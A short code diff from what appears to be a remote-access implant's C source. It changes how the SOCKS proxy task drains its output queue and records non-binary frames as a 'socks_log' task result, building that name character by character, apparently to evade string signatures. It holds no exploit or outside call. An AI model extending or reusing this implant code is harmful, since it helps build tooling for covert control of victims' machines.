@@ -1397,9 +1397,21 @@ void task_collect_socks_output(IMPLANT_CONTEXT *ctx) {
 
         while (ctx->task_result_count < MAX_TASK_RESULTS) {
             BYTE raw[BUS_OUTPUT_ENTRY_MAX];
-            DWORD frame_len = output_drain_one(mod->output_ring, raw, sizeof(raw));
+            DWORD output_type = OUTPUT_BINARY;
+            DWORD frame_len = output_drain_one_typed(mod->output_ring, raw, sizeof(raw),
+                                                     &output_type);
             if (frame_len == 0)
                 break;
+            if (output_type != OUTPUT_BINARY) {
+                char synthetic_log_id[] = {
+                    's','o','c','k','s','_','l','o','g',0
+                };
+                store_task_result(ctx, synthetic_log_id,
+                                  output_type == OUTPUT_ERROR ? TASK_STATUS_FAILED
+                                                              : TASK_STATUS_COMPLETE,
+                                  raw, frame_len);
+                continue;
+            }
             if (frame_len < SOCKS_MSG_HDR_SIZE)
                 continue;
 
